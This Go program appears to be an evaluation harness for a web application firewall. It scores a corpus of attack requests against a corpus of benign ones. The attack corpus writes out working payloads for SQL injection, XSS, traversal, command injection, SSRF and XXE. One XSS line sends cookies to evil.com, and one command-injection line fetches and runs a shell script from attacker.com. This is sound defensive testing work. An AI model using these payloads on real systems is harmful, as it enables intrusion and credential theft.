// cmd/wafeval/main.go
//
// WAF Rule-Engine Empirical Evaluation Harness
// =============================================
// Loads the production rule set (configs/rules/all_rules.json) through the
// real engine and evaluates two corpora:
//   - ATTACK  (≥45 requests) — realistic malicious payloads covering every
//             category present in the rule set.
//   - BENIGN  (≥50 requests) — normal application traffic deliberately
//             seeded with FP-bait (words that could superficially resemble
//             attack tokens but are benign in context).
//
// Classification thresholds mirror configs/config.yaml:
//   score ≥ 5.0  → BLOCK
//   score ≥ 4.0  → CHALLENGE
//   score ≥ 3.0  → GRAY (would be sent to the ML arbiter)
//   score  < 3.0 → ALLOW
//
// Run:
//   cd /Users/nguyenthang/waf-project
//   go run ./cmd/wafeval
//
// Author note: no production file is modified by this program.

package main

import (
	"fmt"
	"os"
	"sort"
	"strings"
	"time"

	"waf-project/internal/engine"
)

// ============================================================
// Thresholds (mirror configs/config.yaml)
// ============================================================

const (
	blockThreshold     = 5.0
	challengeThreshold = 4.0
	grayThreshold      = 3.0 // ml.gray_lower
)

// ============================================================
// Corpus entry
// ============================================================

type TestCase struct {
	Name            string
	Category        string
	Method          string
	Path            string   // raw path
	Query           string   // raw query string (no leading "?")
	Body            string   // raw body text
	ContentType     string   // Content-Type header value
	UserAgent       string
	ExtraHeaders    map[string]string
	ExpectMalicious bool
}

func (tc TestCase) toParsedRequest() *engine.ParsedRequest {
	headers := make(map[string][]string)
	ua := tc.UserAgent
	if ua == "" {
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
	}
	headers["User-Agent"] = []string{ua}
	ct := tc.ContentType
	if ct == "" && tc.Body != "" {
		ct = "application/x-www-form-urlencoded"
	}
	if ct != "" {
		headers["Content-Type"] = []string{ct}
	}
	for k, v := range tc.ExtraHeaders {
		headers[k] = []string{v}
	}

	method := tc.Method
	if method == "" {
		method = "GET"
	}

	return &engine.ParsedRequest{
		RequestID:       fmt.Sprintf("eval-%d", time.Now().UnixNano()),
		Timestamp:       time.Now(),
		RawMethod:       method,
		Method:          strings.ToUpper(method),
		RawPath:         tc.Path,
		RawQuery:        tc.Query,
		RawBody:         []byte(tc.Body),
		RawHeaders:      headers,
		HeaderCount:     len(headers),
		ClientIP:        "203.0.113.42", // RFC 5737 TEST-NET — not a real IP
		Protocol:        "HTTP/1.1",
		Host:            "example.com",
		UserAgent:       ua,
		ContentType:     ct,
		Cookies:         make(map[string]string),
		BodySize:        len(tc.Body),
		NormalizedPath:  tc.Path,
		NormalizedQuery: tc.Query,
		NormalizedBody:  tc.Body,
	}
}

// ============================================================
// ATTACK CORPUS  (45+ requests)
// ============================================================

var attacks = []TestCase{

	// ---- SQL INJECTION (sqli) ----
	{
		Name: "SQLi classic UNION SELECT", Category: "sqli",
		Method: "GET", Path: "/products",
		Query:           "id=1' UNION SELECT NULL,username,password FROM users--",
		ExpectMalicious: true,
	},
	{
		Name: "SQLi boolean-blind", Category: "sqli",
		Method: "GET", Path: "/login",
		Query:           "user=admin' AND 1=1--&pass=x",
		ExpectMalicious: true,
	},
	{
		Name: "SQLi error-based EXTRACTVALUE", Category: "sqli",
		Method: "POST", Path: "/search",
		Body:            "q=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
		ExpectMalicious: true,
	},
	{
		Name: "SQLi stacked queries", Category: "sqli",
		Method: "POST", Path: "/order",
		Body:            "id=1;DROP TABLE orders;--",
		ExpectMalicious: true,
	},
	{
		Name: "SQLi time-based SLEEP", Category: "sqli",
		Method: "GET", Path: "/api/item",
		Query:           "id=1' AND SLEEP(5)--",
		ExpectMalicious: true,
	},
	{
		Name: "SQLi INFORMATION_SCHEMA dump", Category: "sqli",
		Method: "GET", Path: "/api/items",
		Query:           "sort=1 UNION SELECT table_name FROM information_schema.tables",
		ExpectMalicious: true,
	},
	{
		Name: "SQLi OR 1=1 in body", Category: "sqli",
		Method: "POST", Path: "/api/login",
		Body:            "username=admin' OR '1'='1&password=x",
		ExpectMalicious: true,
	},

	// ---- XSS (xss) ----
	{
		Name: "XSS script tag in query", Category: "xss",
		Method: "GET", Path: "/search",
		Query:           "q=<script>alert(document.cookie)</script>",
		ExpectMalicious: true,
	},
	{
		Name: "XSS onerror img tag", Category: "xss",
		Method: "GET", Path: "/profile",
		Query:           "name=<img src=x onerror=alert(1)>",
		ExpectMalicious: true,
	},
	{
		Name: "XSS javascript: URI", Category: "xss",
		Method: "GET", Path: "/redirect",
		Query:           "url=javascript:alert(document.domain)",
		ExpectMalicious: true,
	},
	{
		Name: "XSS SVG onload", Category: "xss",
		Method: "POST", Path: "/comment",
		Body:            "content=<svg onload=fetch('https://evil.com/?c='+document.cookie)>",
		ExpectMalicious: true,
	},
	{
		Name: "XSS DOM innerHTML via body", Category: "xss",
		Method: "POST", Path: "/feedback",
		Body:            "msg=<iframe src=javascript:alert(1)></iframe>",
		ExpectMalicious: true,
	},
	{
		Name: "XSS event handler attribute", Category: "xss",
		Method: "GET", Path: "/items",
		Query:           "filter=<div onmouseover='alert(1)'>hover</div>",
		ExpectMalicious: true,
	},

	// ---- LFI / PATH TRAVERSAL (lfi) ----
	{
		Name: "LFI classic etc/passwd", Category: "lfi",
		Method: "GET", Path: "/download",
		Query:           "file=../../../../etc/passwd",
		ExpectMalicious: true,
	},
	{
		Name: "LFI Windows path", Category: "lfi",
		Method: "GET", Path: "/view",
		Query:           "page=..\\..\\..\\windows\\win.ini",
		ExpectMalicious: true,
	},
	{
		Name: "LFI PHP wrapper", Category: "lfi",
		Method: "GET", Path: "/include",
		Query:           "f=php://filter/convert.base64-encode/resource=config.php",
		ExpectMalicious: true,
	},
	{
		Name: "LFI null-byte bypass", Category: "lfi",
		Method: "GET", Path: "/file",
		Query:           "name=../../etc/shadow%00.png",
		ExpectMalicious: true,
	},
	{
		Name: "LFI /proc/self/environ", Category: "lfi",
		Method: "GET", Path: "/log",
		Query:           "path=/proc/self/environ",
		ExpectMalicious: true,
	},

	// ---- RCE / COMMAND INJECTION (rce) ----
	{
		Name: "RCE shell semicolon injection", Category: "rce",
		Method: "POST", Path: "/ping",
		Body:            "host=127.0.0.1;cat /etc/passwd",
		ExpectMalicious: true,
	},
	{
		Name: "RCE pipe injection", Category: "rce",
		Method: "POST", Path: "/lookup",
		Body:            "domain=example.com|whoami",
		ExpectMalicious: true,
	},
	{
		Name: "RCE backtick subshell", Category: "rce",
		Method: "GET", Path: "/exec",
		Query:           "cmd=`id`",
		ExpectMalicious: true,
	},
	{
		Name: "RCE $() subshell", Category: "rce",
		Method: "GET", Path: "/run",
		Query:           "q=$(cat /etc/hosts)",
		ExpectMalicious: true,
	},
	{
		Name: "RCE template injection Jinja2", Category: "rce",
		Method: "GET", Path: "/greet",
		Query:           "name={{7*7}}",
		ExpectMalicious: true,
	},
	{
		Name: "RCE Spring EL injection", Category: "rce",
		Method: "GET", Path: "/expr",
		Query:           "e=${T(java.lang.Runtime).getRuntime().exec('id')}",
		ExpectMalicious: true,
	},

	// ---- SSRF ----
	{
		Name: "SSRF AWS metadata", Category: "ssrf",
		Method: "GET", Path: "/fetch",
		Query:           "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		ExpectMalicious: true,
	},
	{
		Name: "SSRF localhost internal", Category: "ssrf",
		Method: "GET", Path: "/proxy",
		Query:           "target=http://localhost:8080/admin",
		ExpectMalicious: true,
	},
	{
		Name: "SSRF file:// scheme", Category: "ssrf",
		Method: "POST", Path: "/import",
		Body:            "url=file:///etc/passwd",
		ExpectMalicious: true,
	},
	{
		Name: "SSRF 0.0.0.0 bypass", Category: "ssrf",
		Method: "GET", Path: "/load",
		Query:           "src=http://0.0.0.0:9200/_cat/indices",
		ExpectMalicious: true,
	},

	// ---- XXE ----
	{
		Name: "XXE external entity", Category: "xxe",
		Method: "POST", Path: "/xml",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		ExpectMalicious: true,
	},
	{
		Name: "XXE SSRF via entity", Category: "xxe",
		Method: "POST", Path: "/api/xml",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><data>&xxe;</data>`,
		ExpectMalicious: true,
	},

	// ---- NoSQLi ----
	{
		Name: "NoSQLi $ne operator", Category: "nosqli",
		Method: "GET", Path: "/users",
		Query:           "role[$ne]=admin",
		ExpectMalicious: true,
	},
	{
		Name: "NoSQLi $where JS injection", Category: "nosqli",
		Method: "POST", Path: "/api/query",
		ContentType: "application/json",
		Body:            `{"$where":"this.password.match(/.*/)"}`,
		ExpectMalicious: true,
	},

	// ---- SCANNER ----
	{
		Name: "Scanner sqlmap UA", Category: "scanner",
		Method: "GET", Path: "/",
		UserAgent:       "sqlmap/1.7.8#stable (https://sqlmap.org)",
		ExpectMalicious: true,
	},
	{
		Name: "Scanner Nikto UA", Category: "scanner",
		Method: "GET", Path: "/",
		UserAgent:       "Nikto/2.1.6",
		ExpectMalicious: true,
	},
	{
		Name: "Scanner .git config probe", Category: "scanner",
		Method: "GET", Path: "/.git/config",
		ExpectMalicious: true,
	},
	{
		Name: "Scanner .env probe", Category: "scanner",
		Method: "GET", Path: "/.env",
		ExpectMalicious: true,
	},
	{
		Name: "Scanner wp-admin probe", Category: "scanner",
		Method: "GET", Path: "/wp-admin/admin-ajax.php",
		ExpectMalicious: true,
	},

	// ---- INFO LEAK (info_leak) ----
	{
		Name: "Info leak phpinfo", Category: "info_leak",
		Method: "GET", Path: "/phpinfo.php",
		ExpectMalicious: true,
	},
	{
		Name: "Info leak /etc/passwd in body", Category: "info_leak",
		Method: "POST", Path: "/report",
		Body:            "log=/etc/passwd",
		ExpectMalicious: true,
	},
	{
		Name: "Info leak backup SQL file probe", Category: "scanner",
		Method: "GET", Path: "/backup/db.sql",
		ExpectMalicious: true,
	},

	// ---- ATO (account takeover indicators) ----
	{
		Name: "ATO credential stuffing UA", Category: "ato",
		Method: "POST", Path: "/login",
		UserAgent:       "python-requests/2.31.0",
		Body:            "username=admin&password=password123",
		ExpectMalicious: true,
	},

	// ---- Additional mixed ----
	{
		Name: "SQLi LOAD_FILE exfil", Category: "sqli",
		Method: "GET", Path: "/api",
		Query:           "id=1 UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",
		ExpectMalicious: true,
	},
	{
		Name: "XSS base64 data: URI", Category: "xss",
		Method: "GET", Path: "/go",
		Query:           "redir=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		ExpectMalicious: true,
	},
	{
		Name: "LFI double-encoded traversal", Category: "lfi",
		Method: "GET", Path: "/page",
		Query:           "f=%252e%252e%252f%252e%252e%252fetc/passwd",
		ExpectMalicious: true,
	},
	{
		Name: "RCE wget exfiltration", Category: "rce",
		Method: "POST", Path: "/cmd",
		Body:            "input=;wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s",
		ExpectMalicious: true,
	},
	{
		Name: "SSRF IPv6 loopback", Category: "ssrf",
		Method: "GET", Path: "/req",
		Query:           "u=http://[::1]/admin",
		ExpectMalicious: true,
	},
}

// ============================================================
// BENIGN CORPUS  (50+ requests) — deliberate FP-bait included
// ============================================================

var benign = []TestCase{

	// Normal page loads
	{
		Name: "Homepage GET", Category: "normal",
		Method: "GET", Path: "/", Query: "",
		ExpectMalicious: false,
	},
	{
		Name: "About page", Category: "normal",
		Method: "GET", Path: "/about", Query: "",
		ExpectMalicious: false,
	},
	{
		Name: "Contact page", Category: "normal",
		Method: "GET", Path: "/contact", Query: "",
		ExpectMalicious: false,
	},
	{
		Name: "Blog listing", Category: "normal",
		Method: "GET", Path: "/blog", Query: "page=1&per_page=20",
		ExpectMalicious: false,
	},
	{
		Name: "Product listing with sort", Category: "normal",
		Method: "GET", Path: "/products",
		Query:           "sort=name&order=asc&page=2", // "order" FP-bait
		ExpectMalicious: false,
	},

	// API calls
	{
		Name: "REST GET user profile", Category: "normal",
		Method: "GET", Path: "/api/users/42",
		ExpectMalicious: false,
	},
	{
		Name: "REST PATCH update name", Category: "normal",
		Method: "PATCH", Path: "/api/users/42",
		ContentType: "application/json",
		Body:            `{"name":"Alice Smith","email":"alice@example.com"}`,
		ExpectMalicious: false,
	},
	{
		Name: "REST DELETE resource", Category: "normal",
		Method: "DELETE", Path: "/api/items/7",
		ExpectMalicious: false,
	},
	{
		Name: "REST search with filter", Category: "normal",
		Method: "GET", Path: "/api/search",
		Query:           "q=laptop&category=electronics&min_price=100&max_price=2000",
		ExpectMalicious: false,
	},
	{
		Name: "Health check", Category: "normal",
		Method: "GET", Path: "/health",
		ExpectMalicious: false,
	},

	// Form submissions
	{
		Name: "Login form", Category: "normal",
		Method: "POST", Path: "/login",
		Body:            "username=john.doe&password=MySecurePass1!",
		ExpectMalicious: false,
	},
	{
		Name: "Registration form", Category: "normal",
		Method: "POST", Path: "/register",
		Body:            "name=Jane+Doe&email=jane%40example.com&password=Pass1234%21&confirm=Pass1234%21",
		ExpectMalicious: false,
	},
	{
		Name: "Contact form submission", Category: "normal",
		Method: "POST", Path: "/contact",
		Body:            "name=Bob&email=bob%40example.com&message=Hello+I+have+a+question+about+your+service",
		ExpectMalicious: false,
	},
	{
		Name: "Newsletter subscribe", Category: "normal",
		Method: "POST", Path: "/subscribe",
		Body:            "email=subscriber%40example.com&list=weekly",
		ExpectMalicious: false,
	},
	{
		Name: "Checkout form", Category: "normal",
		Method: "POST", Path: "/checkout",
		ContentType: "application/json",
		Body:            `{"cart_id":123,"address":{"street":"123 Main St","city":"Springfield"},"payment":"card"}`,
		ExpectMalicious: false,
	},

	// FP-bait: benign text containing suspicious-looking words
	{
		Name: "FP-bait: search 'select an option'", Category: "fp_bait",
		Method: "GET", Path: "/search",
		Query:           "q=please+select+an+option+from+the+dropdown",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: blog post about javascript", Category: "fp_bait",
		Method: "GET", Path: "/blog/javascript-tutorial",
		Query:           "ref=google",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: order by phone in filter", Category: "fp_bait",
		Method: "GET", Path: "/users",
		Query:           "sort=phone&order=desc",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: 'scripts for beginners' search", Category: "fp_bait",
		Method: "GET", Path: "/search",
		Query:           "q=scripts+for+beginners",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: description with 'union' word", Category: "fp_bait",
		Method: "POST", Path: "/products",
		ContentType: "application/json",
		Body:            `{"description":"The European Union requires GDPR compliance for all data processors"}`,
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: 'exec' in filename", Category: "fp_bait",
		Method: "GET", Path: "/docs/exec-summary.pdf",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: 'drop' in product name", Category: "fp_bait",
		Method: "GET", Path: "/shop",
		Query:           "category=drop+earrings",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: comment about 'null'", Category: "fp_bait",
		Method: "POST", Path: "/comments",
		Body:            "text=The+return+value+is+null+when+no+result+is+found",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: 'alert' in notification pref", Category: "fp_bait",
		Method: "POST", Path: "/settings/notifications",
		ContentType: "application/json",
		Body:            `{"email_alert":true,"sms_alert":false,"push_alert":true}`,
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: normal CSV upload", Category: "fp_bait",
		Method: "POST", Path: "/import",
		ContentType: "text/csv",
		Body:            "name,email,role\nAlice,alice@co.com,viewer\nBob,bob@co.com,editor",
		ExpectMalicious: false,
	},

	// Normal User-Agents (not attack tools)
	{
		Name: "Chrome desktop UA", Category: "normal",
		Method: "GET", Path: "/",
		UserAgent:       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		ExpectMalicious: false,
	},
	{
		Name: "Firefox mobile UA", Category: "normal",
		Method: "GET", Path: "/",
		UserAgent:       "Mozilla/5.0 (Android 13; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
		ExpectMalicious: false,
	},
	{
		Name: "Safari macOS UA", Category: "normal",
		Method: "GET", Path: "/",
		UserAgent:       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
		ExpectMalicious: false,
	},
	{
		Name: "Googlebot UA", Category: "normal",
		Method: "GET", Path: "/sitemap.xml",
		UserAgent:       "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		ExpectMalicious: false,
	},

	// JSON API calls
	{
		Name: "JSON create post", Category: "normal",
		Method: "POST", Path: "/api/posts",
		ContentType: "application/json",
		Body:            `{"title":"My First Post","body":"Hello world content here","tags":["news","tech"]}`,
		ExpectMalicious: false,
	},
	{
		Name: "JSON update settings", Category: "normal",
		Method: "PUT", Path: "/api/settings",
		ContentType: "application/json",
		Body:            `{"theme":"dark","language":"en","notifications":true}`,
		ExpectMalicious: false,
	},
	{
		Name: "JSON search with special chars", Category: "normal",
		Method: "POST", Path: "/api/search",
		ContentType: "application/json",
		Body:            `{"query":"O'Brien","filters":{"status":"active"}}`,
		ExpectMalicious: false,
	},

	// Edge cases: normal numeric/ID inputs
	{
		Name: "Numeric ID query", Category: "normal",
		Method: "GET", Path: "/orders",
		Query:           "id=12345&status=shipped",
		ExpectMalicious: false,
	},
	{
		Name: "Date range filter", Category: "normal",
		Method: "GET", Path: "/reports",
		Query:           "from=2024-01-01&to=2024-12-31&format=json",
		ExpectMalicious: false,
	},
	{
		Name: "Pagination request", Category: "normal",
		Method: "GET", Path: "/api/items",
		Query:           "offset=40&limit=20",
		ExpectMalicious: false,
	},
	{
		Name: "UUID path param", Category: "normal",
		Method: "GET", Path: "/api/sessions/550e8400-e29b-41d4-a716-446655440000",
		ExpectMalicious: false,
	},

	// Normal headers
	{
		Name: "Request with Accept header", Category: "normal",
		Method: "GET", Path: "/api/data",
		ExtraHeaders: map[string]string{
			"Accept":          "application/json",
			"Accept-Language": "en-US,en;q=0.9",
		},
		ExpectMalicious: false,
	},
	{
		Name: "CORS preflight-like", Category: "normal",
		Method: "OPTIONS", Path: "/api/users",
		ExtraHeaders: map[string]string{
			"Access-Control-Request-Method":  "POST",
			"Access-Control-Request-Headers": "Content-Type",
		},
		ExpectMalicious: false,
	},

	// Longer benign bodies
	{
		Name: "Long review text", Category: "normal",
		Method: "POST", Path: "/reviews",
		Body: "review=This+product+is+great.+I+ordered+it+last+week+and+it+arrived+on+time.+" +
			"The+quality+is+excellent+and+it+was+exactly+as+described.+" +
			"Would+definitely+recommend+to+others.",
		ExpectMalicious: false,
	},
	{
		Name: "Support ticket body", Category: "normal",
		Method: "POST", Path: "/support",
		Body: "subject=Login+issue&description=I+cannot+login+to+my+account.+I+have+tried+resetting+" +
			"my+password+but+still+get+an+error+message.+Please+help.&priority=medium",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: markdown with code fence", Category: "fp_bait",
		Method: "POST", Path: "/wiki/edit",
		ContentType: "text/plain",
		Body: "# How to use SELECT\n\nUse `SELECT *` to fetch all rows. " +
			"Use `WHERE` clause to filter. Example:\n```sql\nSELECT id, name FROM users WHERE active=1;\n```\n" +
			"This is documentation, not an attack.",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: path with 'etc' directory (legit)", Category: "fp_bait",
		Method: "GET", Path: "/docs/etc/configuration-guide",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: shell scripting tutorial content", Category: "fp_bait",
		Method: "POST", Path: "/forum/post",
		Body: "title=Bash+scripting+tutorial&body=In+bash+you+can+use+pipes+and+redirects.+" +
			"For+example:+cat+file.txt+|+grep+pattern+>+output.txt",
		ExpectMalicious: false,
	},
	{
		Name: "Normal multipart-like upload description", Category: "normal",
		Method: "POST", Path: "/upload",
		ContentType: "application/json",
		Body:            `{"filename":"photo.jpg","description":"Profile picture uploaded by user","size":204800}`,
		ExpectMalicious: false,
	},
	{
		Name: "Normal redirect with safe URL", Category: "normal",
		Method: "GET", Path: "/redirect",
		Query:           "url=https://www.example.com/dashboard",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: 'where' in natural language query", Category: "fp_bait",
		Method: "GET", Path: "/faq",
		Query:           "q=where+can+I+find+the+order+history",
		ExpectMalicious: false,
	},
	{
		Name: "Normal PUT with numeric values", Category: "normal",
		Method: "PUT", Path: "/api/cart/5",
		ContentType: "application/json",
		Body:            `{"quantity":3,"price":29.99}`,
		ExpectMalicious: false,
	},
	{
		Name: "Authenticated API call", Category: "normal",
		Method: "GET", Path: "/api/me",
		ExtraHeaders: map[string]string{
			"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.abc123",
		},
		ExpectMalicious: false,
	},
	{
		Name: "Static asset CSS", Category: "normal",
		Method: "GET", Path: "/static/css/main.css",
		ExpectMalicious: false,
	},
	{
		Name: "Static asset JS", Category: "normal",
		Method: "GET", Path: "/static/js/app.bundle.js",
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: 'iframe' in educational content", Category: "fp_bait",
		Method: "POST", Path: "/articles",
		ContentType: "application/json",
		Body:            `{"content":"You can embed videos using the iframe HTML element. Example: <iframe src='https://youtube.com/embed/abc' title='video'></iframe>"}`,
		ExpectMalicious: false,
	},
	{
		Name: "FP-bait: 'eval' in programming discussion", Category: "fp_bait",
		Method: "POST", Path: "/forum/reply",
		Body: "text=Avoid+using+eval()+in+JavaScript+because+it+can+introduce+security+vulnerabilities",
		ExpectMalicious: false,
	},
}

// ============================================================
// Classify by score
// ============================================================

func classify(score float64) string {
	switch {
	case score >= blockThreshold:
		return "BLOCK"
	case score >= challengeThreshold:
		return "CHALLENGE"
	case score >= grayThreshold:
		return "GRAY"
	default:
		return "ALLOW"
	}
}

// ============================================================
// Main
// ============================================================

func main() {
	// ---- 1. Load rule engine ----
	re := engine.NewRuleEngine()
	re.SetThresholds(blockThreshold, challengeThreshold, grayThreshold)

	rulesPath := "configs/rules/all_rules.json"
	if err := re.LoadRulesFromFile(rulesPath); err != nil {
		fmt.Fprintf(os.Stderr, "FATAL: failed to load rules: %v\n", err)
		os.Exit(1)
	}
	nRules := re.RuleCount()
	fmt.Printf("rules loaded: %d/78\n\n", nRules)
	if nRules != 78 {
		fmt.Fprintf(os.Stderr, "WARNING: expected 78 rules, got %d\n", nRules)
	}

	// ---- 2. Evaluate corpora ----
	type result struct {
		tc         TestCase
		score      float64
		decision   string
		matchedIDs []string
	}

	runCorpus := func(corpus []TestCase) []result {
		out := make([]result, 0, len(corpus))
		for _, tc := range corpus {
			req := tc.toParsedRequest()
			ev := re.Evaluate(req)
			ids := make([]string, 0, len(ev.MatchedRules))
			for _, mr := range ev.MatchedRules {
				ids = append(ids, mr.RuleID)
			}
			out = append(out, result{
				tc:         tc,
				score:      ev.TotalScore,
				decision:   classify(ev.TotalScore),
				matchedIDs: ids,
			})
		}
		return out
	}

	attackResults := runCorpus(attacks)
	benignResults := runCorpus(benign)

	// ---- 3. Aggregate attack stats ----
	type catStat struct {
		total, blocked, challenged, gray, allowed int
	}
	catMap := make(map[string]*catStat)
	attackBlocked, attackChallenged, attackGray, attackAllowed := 0, 0, 0, 0

	for _, r := range attackResults {
		if catMap[r.tc.Category] == nil {
			catMap[r.tc.Category] = &catStat{}
		}
		catMap[r.tc.Category].total++
		switch r.decision {
		case "BLOCK":
			attackBlocked++
			catMap[r.tc.Category].blocked++
		case "CHALLENGE":
			attackChallenged++
			catMap[r.tc.Category].challenged++
		case "GRAY":
			attackGray++
			catMap[r.tc.Category].gray++
		default:
			attackAllowed++
			catMap[r.tc.Category].allowed++
		}
	}
	totalAttacks := len(attackResults)
	attackCaught := attackBlocked + attackChallenged + attackGray

	// ---- 4. Aggregate benign stats ----
	benignBlocked, benignChallenged, benignGray, benignAllowed := 0, 0, 0, 0
	for _, r := range benignResults {
		switch r.decision {
		case "BLOCK":
			benignBlocked++
		case "CHALLENGE":
			benignChallenged++
		case "GRAY":
			benignGray++
		default:
			benignAllowed++
		}
	}
	totalBenign := len(benignResults)

	// ---- 5. Print summary ----
	sep := strings.Repeat("=", 70)
	fmt.Println(sep)
	fmt.Println("WAF RULE ENGINE EMPIRICAL EVALUATION")
	fmt.Printf("Date: %s\n", time.Now().Format("2006-01-02"))
	fmt.Printf("Rules file: %s\n", rulesPath)
	fmt.Printf("Rules loaded: %d\n", nRules)
	fmt.Println(sep)

	fmt.Printf("\n[ATTACK CORPUS]  total=%d\n", totalAttacks)
	fmt.Printf("  BLOCK       : %d  (%.1f%%)\n", attackBlocked, pct(attackBlocked, totalAttacks))
	fmt.Printf("  CHALLENGE   : %d  (%.1f%%)\n", attackChallenged, pct(attackChallenged, totalAttacks))
	fmt.Printf("  GRAY (→ML)  : %d  (%.1f%%)\n", attackGray, pct(attackGray, totalAttacks))
	fmt.Printf("  ALLOW(missed): %d  (%.1f%%)\n", attackAllowed, pct(attackAllowed, totalAttacks))
	fmt.Printf("  ──────────────────────────────\n")
	fmt.Printf("  BLOCK rate  : %.1f%%  (blocked / total)\n", pct(attackBlocked, totalAttacks))
	fmt.Printf("  CAUGHT rate : %.1f%%  (block+challenge+gray / total)\n", pct(attackCaught, totalAttacks))

	fmt.Printf("\n[BENIGN CORPUS]  total=%d\n", totalBenign)
	fmt.Printf("  ALLOW       : %d  (%.1f%%)\n", benignAllowed, pct(benignAllowed, totalBenign))
	fmt.Printf("  GRAY        : %d  (%.1f%%)\n", benignGray, pct(benignGray, totalBenign))
	fmt.Printf("  CHALLENGE   : %d  (%.1f%%)\n", benignChallenged, pct(benignChallenged, totalBenign))
	fmt.Printf("  BLOCK (FP!) : %d  (%.1f%%)\n", benignBlocked, pct(benignBlocked, totalBenign))
	fmt.Printf("  ──────────────────────────────\n")
	fmt.Printf("  FP(block) rate: %.1f%%  (benign blocked / total benign)\n", pct(benignBlocked, totalBenign))

	// ---- 6. Per-category breakdown ----
	fmt.Printf("\n[ATTACK — PER CATEGORY]\n")
	fmt.Printf("  %-16s %5s %5s %5s %5s %5s  %s\n",
		"Category", "Total", "BLOCK", "CHAL", "GRAY", "MISS", "BLOCK%")
	cats := make([]string, 0, len(catMap))
	for k := range catMap {
		cats = append(cats, k)
	}
	sort.Strings(cats)
	for _, cat := range cats {
		s := catMap[cat]
		fmt.Printf("  %-16s %5d %5d %5d %5d %5d  %.0f%%\n",
			cat, s.total, s.blocked, s.challenged, s.gray, s.allowed,
			pct(s.blocked, s.total))
	}

	// ---- 7. Escaped attacks (allowed) ----
	fmt.Printf("\n[ESCAPED ATTACKS — allowed by rule engine (score < %.1f)]\n", blockThreshold)
	escapedAny := false
	for _, r := range attackResults {
		if r.decision != "BLOCK" {
			escapedAny = true
			fmt.Printf("  [%-10s] %-14s score=%.2f  decision=%-10s  %s\n",
				r.decision, r.tc.Category, r.score, r.decision, r.tc.Name)
		}
	}
	if !escapedAny {
		fmt.Println("  (none — all attacks blocked)")
	}

	// ---- 8. False positives (benign blocked or challenged) ----
	fmt.Printf("\n[FALSE POSITIVES — benign requests raised above ALLOW]\n")
	fpAny := false
	for _, r := range benignResults {
		if r.decision != "ALLOW" {
			fpAny = true
			fmt.Printf("  [%-9s] %-12s score=%.2f  rules=%s  %s\n",
				r.decision, r.tc.Category, r.score,
				strings.Join(r.matchedIDs, ","), r.tc.Name)
		}
	}
	if !fpAny {
		fmt.Println("  (none — all benign requests allowed)")
	}

	// ---- 9. Full result table for reference ----
	fmt.Printf("\n[DETAILED RESULTS — ATTACK]\n")
	fmt.Printf("  %-42s %-12s %6s  %s\n", "Name", "Category", "Score", "Decision")
	for _, r := range attackResults {
		fmt.Printf("  %-42s %-12s %6.2f  %s\n",
			truncStr(r.tc.Name, 42), r.tc.Category, r.score, r.decision)
	}

	fmt.Printf("\n[DETAILED RESULTS — BENIGN]\n")
	fmt.Printf("  %-42s %-12s %6s  %s\n", "Name", "Category", "Score", "Decision")
	for _, r := range benignResults {
		fmt.Printf("  %-42s %-12s %6.2f  %s\n",
			truncStr(r.tc.Name, 42), r.tc.Category, r.score, r.decision)
	}

	fmt.Printf("\n%s\n", sep)
	fmt.Println("END OF EVALUATION")
}

func pct(n, total int) float64 {
	if total == 0 {
		return 0
	}
	return float64(n) / float64(total) * 100
}

func truncStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-1] + "…"
}
